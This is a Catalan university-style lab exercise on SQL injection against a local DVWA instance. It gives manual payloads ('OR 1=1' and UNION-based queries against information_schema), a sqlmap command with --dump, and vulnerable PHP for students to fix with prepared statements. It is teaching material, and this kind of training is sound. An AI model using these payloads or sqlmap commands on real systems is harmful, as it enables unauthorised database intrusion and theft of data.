---
tipus: exercici
codi: "LAB-05"
titol: "Explotació i Mitigació d'Injeccions SQL a DVWA"
bloc: "02_Hacking_Web"
ra:
  - "RA2"
  - "RA3"
dificultat: "Mitjana"
entorn_requerit: "DVWA a Docker + Burp Suite"
avaluable: true
pes_nota: "5%"
temps_estimat_min: 90
tags:
  - docencia/exercici
  - vulnerabilitat/sqli
  - ra/ra2
  - ra/ra3
---

# 🧪 LAB-05: Explotació i Mitigació d'Injeccions SQL a DVWA

> **Codi**: `LAB-05` | **Mòdul**: 5023 | **Durada**: 90 minuts | **Qualificació**: Avaluable (5%)

---

## 🎯 Objectius
* Comprendre el mecanisme d'una vulnerabilitat d'Injecció SQL (SQLi).
* Explotar una SQLi clàssica i extreure informació de la base de dades (usuaris, taules, hashes).
* Automatitzar la detecció amb l'eina `sqlmap`.
* Analitzar el codi PHP vulnerable i proposar la solució defensiva mitjançant sentències preparades.

---

## 📋 Tasques Pas a Pas

### Tasca 1: SQLi Clàssica Manual
1. Accedeix a la secció **SQL Injection** de DVWA (nivell de seguretat: Low).
2. Introdueix un ID legítim com `1`. Observa la resposta.
3. Introdueix una cometa simple: `1'`. Què respon l'aplicació? Quin tipus d'error apareix?
4. Extreu tots els usuaris de la taula injectant una condició booleana sempre certa:
```sql
1' OR '1'='1
```

### Tasca 2: Extracció amb UNION Based SQLi
Determina el nombre de columnes i la versió de la base de dades:
```sql
1' UNION SELECT null, version() #
```
Aconsegueix extreure els noms de totes les taules de la base de dades consultant `information_schema.tables`:
```sql
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() #
```

### Tasca 3: Automatització amb SQLmap
Intercepta la petició amb Burp Suite i copia la cookie de sessió. Executa SQLmap des de la terminal:
```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<TEU_COOKIE>; security=low" --dbs
```
Extreu la taula d'usuaris (`--tables`) i descarrega els registres (`--dump`).

### Tasca 4: Anàlisi del Codi i Correcció
El codi vulnerable de DVWA és:
```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```
Escriu el bloc de codi equivalent utilitzant sentències preparades amb PDO per mitigar completament la injecció.

---

## 📤 Evidències a Lliurar
Document tècnic d'auditoria que inclogui:
1. Captura de pantalla amb l'extracció de la versió de la base de dades mitjançant UNION.
2. Captura d'execució de SQLmap amb les bases de dades detectades.
3. El fragment de codi PHP refactoritzat i segur explicant per què les sentències preparades immunitzen contra la injecció.
